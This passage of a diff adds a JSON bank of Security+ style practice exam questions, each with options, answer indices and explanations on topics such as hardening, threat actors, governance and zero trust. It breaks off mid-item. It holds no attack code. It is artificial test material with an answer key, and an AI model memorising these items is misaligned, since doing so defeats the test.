@@ -1,0 +1,4358 @@
+[
+  {
+    "id": "SECPLUS-T1-001",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Secure baselines",
+    "stem": "A company wants every new Windows server to start from the same hardened configuration that meets CIS recommendations. What should the security team create FIRST?",
+    "options": [
+      "A disaster recovery runbook",
+      "A secure baseline configuration",
+      "A vulnerability exception register",
+      "A network topology diagram for the data center"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A secure baseline defines the approved hardened settings that are then deployed and maintained on every server. A runbook or topology diagram documents other things and does not set configuration standards."
+  },
+  {
+    "id": "SECPLUS-T1-002",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Threat actors",
+    "stem": "Investigators find that an adversary kept stealthy access to a defense contractor's network for three years using custom malware and previously unknown exploits. Which threat actor is MOST likely responsible?",
+    "options": [
+      "Unskilled attacker",
+      "Hacktivist group",
+      "Nation-state",
+      "Organized crime"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Years of covert access, custom tooling and zero-day exploits point to an advanced persistent threat with the funding and sophistication of a nation-state pursuing espionage. Organized crime is financially motivated and usually monetizes access quickly rather than hiding for years."
+  },
+  {
+    "id": "SECPLUS-T1-003",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Governance structures",
+    "stem": "A multinational company lets each regional business unit write and enforce its own security policies with little oversight from headquarters. Which governance structure does this describe?",
+    "options": [
+      "Government entity oversight",
+      "Decentralized governance",
+      "Board-directed committee governance",
+      "Centralized governance"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Decentralized governance pushes security decisions down to individual business units. Centralized governance would have headquarters set and enforce one policy set for every region."
+  },
+  {
+    "id": "SECPLUS-T1-004",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Shared responsibility",
+    "stem": "A company migrates its application servers to an IaaS provider. Under the shared responsibility matrix, which task remains the customer's responsibility?",
+    "options": [
+      "Physical security of the data center",
+      "Replacing failed hypervisor host hardware",
+      "Supplying power and cooling to racks",
+      "Patching the guest operating systems"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "In IaaS the customer manages everything from the guest operating system upward, including patching. Physical security, host hardware and facilities stay with the provider, which is why those tempting choices are wrong."
+  },
+  {
+    "id": "SECPLUS-T1-005",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "CIA triad",
+    "stem": "A software team publishes a SHA-256 value beside each download. A user's computed hash does not match the published value. Which part of the CIA triad has been violated?",
+    "options": [
+      "Integrity",
+      "Confidentiality",
+      "Availability",
+      "Accounting"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A mismatched hash shows the file was altered, which is a loss of integrity. Confidentiality concerns unauthorized disclosure, and nothing here shows the file's contents were exposed."
+  },
+  {
+    "id": "SECPLUS-T1-006",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "multi",
+    "skill": "Server hardening",
+    "select": 3,
+    "stem": "An administrator is building a new Linux web server from a minimal image. Which THREE steps harden it? (Choose three.)",
+    "options": [
+      "Disable services that are not needed",
+      "Apply the latest security patches",
+      "Change default account passwords",
+      "Enable Telnet for backup access",
+      "Run the web service as root",
+      "Allow all inbound ports for monitoring"
+    ],
+    "correct": [
+      0,
+      1,
+      2
+    ],
+    "explanation": "Removing unneeded services shrinks the attack surface, patching closes known flaws, and changing defaults stops credential guessing. Enabling Telnet adds a cleartext management protocol and weakens the server."
+  },
+  {
+    "id": "SECPLUS-T1-007",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Patch management",
+    "stem": "A vendor published a security advisory and CVE for a remote code execution flaw in the company's VPN appliance, and fixed firmware is available. Which mitigation is MOST appropriate?",
+    "options": [
+      "Isolate the appliance permanently",
+      "Apply the vendor patch",
+      "Add an application allow list",
+      "Monitor logs for exploitation"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A published, documented vulnerability with an available fix is best mitigated by patching the firmware promptly. Monitoring only detects exploitation after the fact and leaves the flaw open."
+  },
+  {
+    "id": "SECPLUS-T1-008",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Acceptable use policy",
+    "stem": "Before receiving a laptop and network credentials, a new hire must sign a document listing permitted uses of company email, internet, and devices. Which policy is this?",
+    "options": [
+      "Acceptable use policy",
+      "Business continuity policy",
+      "Information security policy",
+      "Change management policy"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "An acceptable use policy defines what users may and may not do with organizational resources and is commonly signed at onboarding. The broader information security policy sets overall security direction rather than individual usage rules."
+  },
+  {
+    "id": "SECPLUS-T1-009",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "multi",
+    "skill": "Infrastructure as code",
+    "select": 2,
+    "stem": "A DevOps team defines its cloud networks, firewall rules and servers in version-controlled infrastructure as code templates. Which TWO security benefits does this provide MOST directly? (Choose two.)",
+    "options": [
+      "Consistent, repeatable deployments",
+      "Changes tracked in version control",
+      "No need for vulnerability scanning",
+      "Automatic protection from zero-days",
+      "Encryption of every stored file"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Templates rebuild the same configuration every time, which limits drift, and version control gives every change a reviewable history. IaC does not remove the need to scan, because a template can faithfully deploy a vulnerable image."
+  },
+  {
+    "id": "SECPLUS-T1-010",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "multi",
+    "skill": "Wireless security",
+    "select": 2,
+    "stem": "A small office is replacing an aging WPA2 access point. Which TWO settings BEST strengthen the new wireless network? (Choose two.)",
+    "options": [
+      "Enable WPA3 with SAE",
+      "Disable Wi-Fi Protected Setup",
+      "Use TKIP for compatibility",
+      "Rely on MAC address filtering alone",
+      "Enable WEP for old printers"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "WPA3 with SAE resists offline dictionary attacks, and disabling WPS removes a PIN feature that is easily brute forced. MAC filtering is tempting but MAC addresses are trivial to spoof."
+  },
+  {
+    "id": "SECPLUS-T1-011",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Threat actors",
+    "stem": "A city agency's public website is defaced with slogans protesting a new zoning law, and the responsible group posts a manifesto online. Which threat actor BEST fits this activity?",
+    "options": [
+      "Hacktivist",
+      "Organized crime",
+      "Nation-state",
+      "Unskilled attacker"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Hacktivists are driven by philosophical or political beliefs and seek publicity, which matches a protest defacement with a manifesto. Organized crime is motivated by financial gain and rarely advertises a cause."
+  },
+  {
+    "id": "SECPLUS-T1-012",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Non-repudiation",
+    "stem": "A purchasing manager approves a contract by email and later claims she never sent the approval. Which control would BEST prevent her from credibly denying it?",
+    "options": [
+      "Encrypting messages with the recipient's public key",
+      "Requiring TLS for all mail server connections",
+      "Digitally signing messages with her private key",
+      "Hashing every message with SHA-256"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "A digital signature made with the sender's private key provides non-repudiation because only she holds that key. Encrypting with the recipient's public key protects confidentiality but proves nothing about who sent the message."
+  },
+  {
+    "id": "SECPLUS-T1-013",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Security standards",
+    "stem": "A document requires that all passwords contain at least 14 characters and that data at rest use AES-256. Which type of governance document is this MOST likely?",
+    "options": [
+      "Policy",
+      "Standard",
+      "Guideline",
+      "Procedure"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Standards set specific, mandatory technical requirements such as password length and encryption strength. A policy states high-level intent, while a guideline is only a recommendation."
+  },
+  {
+    "id": "SECPLUS-T1-014",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Wireless site surveys",
+    "stem": "Before deploying Wi-Fi in a large warehouse, an engineer wants to map signal strength and find dead zones and interference. What should the engineer perform?",
+    "options": [
+      "A site survey producing a heat map",
+      "A packet capture of the wired uplink",
+      "A NetFlow analysis on the core router",
+      "An SNMP trap review on each access point"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A wireless site survey measures coverage and interference and is often visualized as a heat map. Packet captures and NetFlow show traffic, not RF coverage."
+  },
+  {
+    "id": "SECPLUS-T1-015",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Serverless",
+    "stem": "A developer deploys code as functions that run only when an event triggers them, and the team never manages the underlying servers. Which architecture is this?",
+    "options": [
+      "Microservices",
+      "Containerization",
+      "Serverless",
+      "Virtualization"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Serverless (function as a service) runs event-driven code while the provider manages all servers and scaling. Microservices is tempting, but it describes splitting an application into services that may still run on servers the team manages."
+  },
+  {
+    "id": "SECPLUS-T1-016",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Actor motivations",
+    "stem": "Two days after receiving a termination notice, a database administrator deletes production tables using still-active credentials. Which motivation BEST describes this insider's action?",
+    "options": [
+      "Revenge",
+      "Espionage",
+      "Financial gain",
+      "Philosophical beliefs"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Destroying data right after being fired is a classic revenge motive for an internal threat actor. Espionage would involve quietly copying data for a competitor or government rather than destroying it."
+  },
+  {
+    "id": "SECPLUS-T1-017",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "WPA3",
+    "stem": "Which WPA3 feature replaces the WPA2 pre-shared key handshake and protects against offline dictionary attacks?",
+    "options": [
+      "Simultaneous Authentication of Equals (SAE)",
+      "Temporal Key Integrity Protocol (TKIP)",
+      "Wi-Fi Protected Setup push-button configuration (WPS)",
+      "Wired Equivalent Privacy (WEP)"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "SAE (Dragonfly) is the WPA3-Personal handshake that resists offline password guessing and adds forward secrecy. TKIP is a deprecated WPA-era cipher, not a WPA3 handshake."
+  },
+  {
+    "id": "SECPLUS-T1-018",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Playbooks",
+    "stem": "The SOC manager wants analysts to follow the same step-by-step actions, contacts, and isolation steps whenever a ransomware alert fires. Which document should be created?",
+    "options": [
+      "Business impact analysis",
+      "Playbook",
+      "Risk register",
+      "Incident response policy"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A playbook is a procedure that gives repeatable, step-by-step response actions for a specific scenario. The incident response policy defines authority and goals but not the detailed steps."
+  },
+  {
+    "id": "SECPLUS-T1-019",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Microservices",
+    "stem": "An online retailer splits its monolithic application into small, independently deployable services that communicate through APIs. Which resilience advantage does this microservices design provide?",
+    "options": [
+      "Every component shares one codebase and database",
+      "A failed service does not take down the others",
+      "Fewer APIs means a smaller attack surface",
+      "Patching requires only a single application restart"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Microservices isolate functions, so one failing service can be restarted or scaled without bringing down the whole application. They actually add APIs and therefore attack surface, so the smaller-attack-surface choice is wrong."
+  },
+  {
+    "id": "SECPLUS-T1-020",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Enterprise Wi-Fi",
+    "stem": "A company wants employees to authenticate to Wi-Fi with their individual directory credentials instead of a shared passphrase. Which configuration BEST meets this requirement?",
+    "options": [
+      "WPA3-Personal with a longer passphrase",
+      "WPA3-Enterprise with 802.1X and a RADIUS server",
+      "WPA2-Personal with a unique passphrase rotated every thirty days",
+      "MAC address filtering on every access point"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Enterprise mode uses 802.1X/EAP with a RADIUS server so each user authenticates with their own credentials. Any Personal mode still relies on one shared passphrase, however long or often rotated."
+  },
+  {
+    "id": "SECPLUS-T1-021",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Shadow IT",
+    "stem": "A marketing team signs up for an unapproved file-sharing service with a corporate card and stores customer lists there without IT's knowledge. This is an example of:",
+    "options": [
+      "A malicious insider threat",
+      "Shadow IT",
+      "Organized crime",
+      "A supply chain vendor attack"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Shadow IT is technology adopted by employees outside the organization's approval and control, usually for convenience rather than harm. A malicious insider intends damage, which nothing in this scenario suggests."
+  },
+  {
+    "id": "SECPLUS-T1-022",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "AAA framework",
+    "stem": "After an outage, auditors need to determine which administrator changed a router configuration and when. Which element of AAA provides this information?",
+    "options": [
+      "Authentication",
+      "Accounting",
+      "Authorization",
+      "Attestation"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Accounting records what authenticated users did and when, creating the trail auditors need. Authorization only determines what the administrator was allowed to do, not what was actually done."
+  },
+  {
+    "id": "SECPLUS-T1-023",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 1,
+    "format": "multi",
+    "skill": "Offboarding",
+    "select": 3,
+    "stem": "An employee is terminated, and HR notifies IT. Which THREE actions belong in the offboarding process? (Choose three.)",
+    "options": [
+      "Disable the user's accounts",
+      "Collect the badge and laptop",
+      "Revoke remote access tokens",
+      "Assign security awareness training",
+      "Have the user sign the AUP",
+      "Create a new email mailbox"
+    ],
+    "correct": [
+      0,
+      1,
+      2
+    ],
+    "explanation": "Offboarding removes access: accounts are disabled, physical assets and badges are recovered, and remote access is revoked. Signing the acceptable use policy and training belong to onboarding."
+  },
+  {
+    "id": "SECPLUS-T1-024",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Mobile deployment models",
+    "stem": "An organization buys smartphones, retains full management control, and allows employees reasonable personal use of them. Which deployment model is this?",
+    "options": [
+      "BYOD",
+      "COPE",
+      "CYOD",
+      "Corporate-owned, business only (COBO)"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Corporate-owned, personally enabled (COPE) devices are company property that staff may also use personally. CYOD lets users pick from an approved list but does not by itself define personal use."
+  },
+  {
+    "id": "SECPLUS-T1-025",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "multi",
+    "skill": "Removable media",
+    "select": 2,
+    "stem": "Several USB drives labeled Payroll Q4 were found in the parking lot, and an employee plugged one into a workstation that then beaconed to an external IP. Which TWO controls would BEST reduce the risk of this attack succeeding again? (Choose two.)",
+    "options": [
+      "Block USB storage with device control",
+      "Train staff to turn in found media",
+      "Encrypt every laptop's internal hard drive",
+      "Require longer domain passwords",
+      "Enable WPA3 on the office Wi-Fi"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Device control stops unknown USB storage from mounting, and awareness training stops people from plugging in found drives. Full-disk encryption protects data on a lost laptop but does nothing against malware delivered by removable media."
+  },
+  {
+    "id": "SECPLUS-T1-026",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Air-gapped networks",
+    "stem": "A water utility must protect a safety-critical control network from all internet-borne threats. Which network architecture provides the STRONGEST isolation?",
+    "options": [
+      "VLAN segmentation on the corporate switches",
+      "An air-gapped network with no external connections",
+      "A stateful firewall with a default-deny rule",
+      "A site-to-site VPN to headquarters"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "An air gap physically separates the network so there is no path for remote attacks. VLANs and firewalls are logical segmentation and still leave a network path that misconfiguration or exploits could open."
+  },
+  {
+    "id": "SECPLUS-T1-027",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Mobile device management",
+    "stem": "Under a BYOD policy, which MDM capability BEST protects corporate data while respecting the employee's personal content?",
+    "options": [
+      "Containerization with selective wipe",
+      "Full device wipe on any policy violation",
+      "Disabling the camera and personal app store",
+      "Requiring a corporate SIM card in every phone"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "MDM containerization separates work apps and data so only the corporate container is wiped. A full device wipe would destroy the employee's personal data on a device they own."
+  },
+  {
+    "id": "SECPLUS-T1-028",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "External considerations",
+    "stem": "A payment processor must comply with PCI DSS, a requirement set by the card brands rather than by any government. Which external consideration BEST describes this?",
+    "options": [
+      "Industry",
+      "Local/regional",
+      "National",
+      "Regulatory"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "PCI DSS is an industry standard enforced through contracts with the card brands. It is tempting to call it regulatory, but no government agency issues or enforces it."
+  },
+  {
+    "id": "SECPLUS-T1-029",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Gap analysis",
+    "stem": "A CISO wants to compare the organization's current security controls against the NIST Cybersecurity Framework to identify missing controls. Which activity should be performed?",
+    "options": [
+      "Penetration test",
+      "Business impact analysis",
+      "Vulnerability scan",
+      "Gap analysis"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A gap analysis measures the current state against a target framework or baseline and lists the differences. A business impact analysis identifies critical functions and recovery needs, not missing controls."
+  },
+  {
+    "id": "SECPLUS-T1-030",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Default credentials",
+    "stem": "A botnet scan logs successful logins to dozens of company IP cameras using the username admin and the password admin. Which hardening step would have BEST prevented this?",
+    "options": [
+      "Changing default passwords",
+      "Installing endpoint protection",
+      "Enabling full-disk encryption",
+      "Deploying a host-based firewall"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "The cameras were accessed with factory default credentials, so changing default passwords removes the attack vector directly. Encryption protects stored data but does nothing to stop a valid login."
+  },
+  {
+    "id": "SECPLUS-T1-031",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Input validation",
+    "stem": "A developer finds that a web form passes user-supplied text directly into a database query. Which control BEST mitigates the resulting risk?",
+    "options": [
+      "Server-side input validation with parameterized queries",
+      "Client-side JavaScript length checks only",
+      "Encrypting the database at rest",
+      "Hiding all database error messages from end users"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Server-side validation plus parameterized queries prevents SQL injection. Client-side checks are easily bypassed, and encryption at rest does nothing to stop a malicious query."
+  },
+  {
+    "id": "SECPLUS-T1-032",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Software-defined networking",
+    "stem": "Which of the following BEST describes the core principle of software-defined networking?",
+    "options": [
+      "Encrypting branch traffic over the public internet",
+      "Assigning each switch port to a VLAN manually",
+      "Isolating hosts with dedicated physical cabling",
+      "Separating the control plane from the data plane"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "SDN decouples the control plane (routing decisions, made centrally in software) from the data plane that forwards packets. Encrypting branch traffic over the internet describes a VPN or SD-WAN, not SDN itself."
+  },
+  {
+    "id": "SECPLUS-T1-033",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "multi",
+    "skill": "Quantitative risk",
+    "select": 2,
+    "stem": "A risk analyst must calculate the annualized loss expectancy for a flood scenario. Which TWO values are multiplied to produce it? (Choose two.)",
+    "options": [
+      "Single loss expectancy",
+      "Annualized rate of occurrence",
+      "Exposure factor",
+      "Asset value",
+      "Recovery time objective in hours"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "ALE equals SLE times ARO. Exposure factor and asset value are multiplied to get the SLE, so they feed the calculation but are not its direct inputs."
+  },
+  {
+    "id": "SECPLUS-T1-034",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Supply chain attacks",
+    "stem": "Attackers compromised a managed service provider's remote monitoring tool and used it to push ransomware to every client the provider supports. Which attack surface was exploited?",
+    "options": [
+      "Unsecure wired network access",
+      "Unsupported legacy applications",
+      "Supply chain via an MSP",
+      "Default credentials on endpoints"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "Managed service providers have trusted access into many customers, so compromising the provider is a supply chain attack against all of them. Default credentials were not needed because the attackers rode the MSP's legitimate access."
+  },
+  {
+    "id": "SECPLUS-T1-035",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Secure cookies",
+    "stem": "A penetration tester notes that session cookies can be read by client-side scripts and are sent over plain HTTP. Which cookie attributes should be set?",
+    "options": [
+      "Secure and HttpOnly",
+      "Domain and Path",
+      "Expires and Max-Age",
+      "SameSite=None and Partitioned"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Secure limits the cookie to HTTPS and HttpOnly blocks JavaScript access, reducing session theft via XSS. Domain and Path only scope where the cookie is sent."
+  },
+  {
+    "id": "SECPLUS-T1-036",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "multi",
+    "skill": "Network appliances",
+    "select": 2,
+    "stem": "A security team needs devices that can actively block malicious traffic in real time before it reaches the web servers. Which TWO should be deployed inline? (Choose two.)",
+    "options": [
+      "Intrusion prevention system",
+      "Web application firewall",
+      "IDS attached to a network tap",
+      "Passive network tap",
+      "Packet capture appliance"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "An IPS and a WAF sit in the traffic path and can drop malicious requests. An IDS on a tap only sees a copy of the traffic, so it can alert but cannot block."
+  },
+  {
+    "id": "SECPLUS-T1-037",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Zero trust",
+    "stem": "In a zero trust architecture, which component evaluates an access request against policy and threat intelligence and decides to grant, deny, or revoke access?",
+    "options": [
+      "Policy enforcement point",
+      "Policy engine",
+      "Policy administrator",
+      "Threat scope reduction"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "The policy engine in the control plane makes the access decision using policy, identity and threat data. The policy administrator only carries out that decision by setting up or tearing down the session path."
+  },
+  {
+    "id": "SECPLUS-T1-038",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Data roles",
+    "stem": "Which data role is accountable for classifying a dataset and approving who may access it, usually a senior business manager?",
+    "options": [
+      "Data owner",
+      "Data processor",
+      "Data steward",
+      "Data custodian"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "The data owner holds ultimate accountability for classification and access decisions. The custodian implements those decisions technically but does not make them."
+  },
+  {
+    "id": "SECPLUS-T1-039",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Code signing",
+    "stem": "Users must be able to verify that a downloaded installer came from the vendor and was not altered in transit. Which control provides this?",
+    "options": [
+      "Code signing",
+      "Sandboxing",
+      "Obfuscation",
+      "Input validation"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "A code-signing certificate lets users verify the publisher and the integrity of the file. Obfuscation only makes code harder to read and proves nothing about its origin."
+  },
+  {
+    "id": "SECPLUS-T1-040",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "matrix",
+    "skill": "Social engineering",
+    "stem": "For each message an employee received, select the social engineering technique it represents.",
+    "rows": [
+      "Text urging a tap to fix delivery",
+      "Voicemail demanding a callback about taxes",
+      "Bulk email with a fake password reset",
+      "Email to the CEO about a fake lawsuit",
+      "Call from a fake bank fraud team"
+    ],
+    "columns": [
+      "Phishing",
+      "Smishing",
+      "Vishing",
+      "Whaling"
+    ],
+    "correct": [
+      1,
+      2,
+      0,
+      3,
+      2
+    ],
+    "explanation": "Smishing uses SMS, vishing uses voice calls and voicemail, broad email lures are phishing, and a lure aimed at a senior executive is whaling. The CEO email is the tempting phishing pick, but targeting an executive specifically makes it whaling."
+  },
+  {
+    "id": "SECPLUS-T1-041",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Sandboxing",
+    "stem": "A security analyst wants to detonate a suspicious email attachment to observe its behavior without risking production systems. What should the analyst use?",
+    "options": [
+      "A jump server",
+      "A screened subnet",
+      "A load balancer",
+      "A sandbox"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A sandbox is an isolated environment for safely executing and observing untrusted code. A screened subnet isolates public-facing services, not malware detonation."
+  },
+  {
+    "id": "SECPLUS-T1-042",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Embedded systems",
+    "stem": "A hospital infusion pump runs a real-time operating system on proprietary embedded hardware. Which consideration is MOST likely to limit the security team's options?",
+    "options": [
+      "Excess compute capacity for security agents",
+      "Frequent automatic updates that disrupt clinicians",
+      "Built-in support for enterprise EDR agents",
+      "Limited patch availability from the manufacturer"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Embedded and RTOS devices depend on the manufacturer for firmware updates and usually lack the compute to run security agents. They rarely have excess capacity or EDR support, so those choices describe the opposite of reality."
+  },
+  {
+    "id": "SECPLUS-T1-043",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Data roles",
+    "stem": "A database administrator performs nightly backups and applies the access permissions that the business unit has approved. Which data role is the administrator performing?",
+    "options": [
+      "Owner",
+      "Custodian",
+      "Data subject",
+      "Controller"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "A custodian handles the day-to-day technical protection of data, such as backups and access enforcement. The owner decides the protections; the custodian carries them out."
+  },
+  {
+    "id": "SECPLUS-T1-044",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Social engineering",
+    "stem": "A caller claiming to be from the bank's fraud department asks a user to read back the one-time passcode that was just sent to her phone. Which attack is occurring?",
+    "options": [
+      "Smishing",
+      "Vishing",
+      "Business email compromise",
+      "Watering hole"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Vishing is voice phishing, where the attacker uses a phone call and a convincing pretext to extract information. The passcode arrived by text, but the attack itself is the voice call, so it is not smishing."
+  },
+  {
+    "id": "SECPLUS-T1-045",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 3,
+    "format": "single",
+    "skill": "Zero trust",
+    "stem": "A zero trust deployment places a gateway in front of a finance application that allows or blocks each session as instructed by the control plane. Which component is this gateway?",
+    "options": [
+      "Policy enforcement point",
+      "Policy engine",
+      "Policy administrator",
+      "Adaptive identity service"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "The policy enforcement point sits in the data plane between the subject and the resource and enforces the decisions it receives. The policy engine makes decisions in the control plane but does not sit in the traffic path."
+  },
+  {
+    "id": "SECPLUS-T1-046",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Asset inventory",
+    "stem": "During an audit, the security team cannot say how many laptops are in use or who is responsible for each one. Which process is MOST lacking?",
+    "options": [
+      "Data loss prevention policy enforcement on endpoints",
+      "Vulnerability exception management",
+      "Change advisory board approvals",
+      "Asset inventory with assigned ownership"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Asset management tracks inventory, enumeration, and assignment of an owner for each device. DLP protects data in motion and use but does not track hardware or ownership."
+  },
+  {
+    "id": "SECPLUS-T1-047",
+    "section": "secplus",
+    "test": 1,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Business email compromise",
+    "stem": "Accounts payable receives a message from the genuine mailbox of a supplier's finance manager asking that future invoices be paid to a new bank account. Which attack is MOST likely?",
+    "options": [
+      "Typosquatting",
+      "Business email compromise",
